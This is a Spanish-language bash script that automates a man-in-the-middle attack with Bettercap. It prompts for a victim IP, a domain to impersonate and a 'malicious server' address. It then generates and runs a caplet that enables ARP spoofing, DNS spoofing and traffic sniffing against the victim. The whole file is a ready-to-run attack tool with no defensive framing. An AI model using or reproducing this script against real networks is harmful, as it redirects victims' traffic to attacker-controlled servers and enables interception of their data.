#!/bin/bash

# Colores para la salida
GREEN='\033[0;32m'
NC='\033[0m' # No Color

echo -e "${GREEN}[*] Iniciando Script de Automatización de DNS Spoofing${NC}"

# Verificar privilegios de root
if [ "$EUID" -ne 0 ]; then
  echo "Por favor, ejecuta este script como root (sudo ./dnsscript.sh)"
  exit
fi

# 1. Configuración de la Interfaz
read -p "Introduce la interfaz de red (ej. eth0): " IFACE
if [ -z "$IFACE" ]; then IFACE="eth0"; fi

# Obtener IP local automáticamente para sugerencia
LOCAL_IP=$(ip -4 addr show $IFACE 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')

# 2. Configuración de la Víctima
read -p "Introduce la IP de la VÍCTIMA: " VICTIM_IP
if [ -z "$VICTIM_IP" ]; then
    echo "Error: Debes especificar una IP de víctima."
    exit 1
fi

# 3. Configuración del Dominio a Suplantar
read -p "Introduce el DOMINIO a suplantar (ej. example.com): " DOMAIN
if [ -z "$DOMAIN" ]; then DOMAIN="example.com"; fi

# 4. Configuración de la IP Maliciosa (Redirección)
read -p "Introduce la IP del SERVIDOR MALICIOSO (Enter para $LOCAL_IP): " SPOOF_IP
if [ -z "$SPOOF_IP" ]; then SPOOF_IP=$LOCAL_IP; fi

echo -e "${GREEN}[*] Generando archivo de configuración (caplet)...${NC}"

# Crear el archivo caplet temporal
CAPLET_FILE="auto_attack.cap"
cat > $CAPLET_FILE <<EOF
# 1. Iniciar descubrimiento de red
net.probe on

# 2. Configurar ARP Spoofing
set arp.spoof.targets $VICTIM_IP
set arp.spoof.fullduplex true

# 3. Configurar DNS Spoofing
set dns.spoof.domains $DOMAIN
set dns.spoof.address $SPOOF_IP
set dns.spoof.all true

# 4. Iniciar los ataques
arp.spoof on
dns.spoof on

# 5. Mostrar la tabla de dispositivos actual
net.show

# 6. Activar sniffer para ver tráfico (opcional, útil para debug)
net.sniff on
EOF

echo -e "${GREEN}[*] Configuración lista. Iniciando Bettercap...${NC}"
echo "--------------------------------------------------------"
echo "Atacando a: $VICTIM_IP"
echo "Suplantando: $DOMAIN -> $SPOOF_IP"
echo "Presiona Ctrl+C para detener."
echo "--------------------------------------------------------"

# Ejecutar bettercap con el caplet
bettercap -iface $IFACE -caplet $CAPLET_FILE

# Limpieza al salir
echo -e "${GREEN}[*] Ataque finalizado.${NC}"
rm $CAPLET_FILE
